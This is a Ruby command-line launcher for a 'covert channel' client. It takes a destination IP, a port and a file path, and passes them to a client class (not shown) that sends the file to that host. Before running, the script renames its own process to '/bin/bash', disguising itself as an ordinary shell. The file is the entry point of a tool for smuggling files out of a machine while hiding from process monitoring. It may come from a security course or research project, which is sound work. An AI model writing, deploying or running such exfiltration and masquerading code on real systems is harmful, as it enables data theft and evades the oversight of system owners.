require "optparse"
require_relative "covert_channel/client"
require_relative "covert_channel/constants"

PROGNAME = File.basename(__FILE__)
PROCESS_NAME = "/bin/bash"

Process.setproctitle(PROCESS_NAME)

options = {}

option_parser = OptionParser.new do |opts|
  opts.banner = "usage: ruby #{PROGNAME} --dst_ip <destination_ip> --dst_port <destination_port> --file <file_path>"

  opts.on("-i", "--dst_ip ip", "specify destination ip") do |ip|
    options[:dst_ip] = ip
  end

  opts.on("-p", "--dst_port port", "specify destination port") do |port|
    options[:dst_port] = port
  end

  opts.on("-f", "--file_path path", "specify path to a file") do |path|
    options[:path] = path
  end

  opts.on("-h", "--help", "print help") do
    $stdout.puts opts
    exit(0)
  end
end

begin
  option_parser.parse!
rescue OptionParser::InvalidOption => e
  $stderr.puts option_parser.banner
  exit(1)
end

CovertChannel::Client.new(**options).call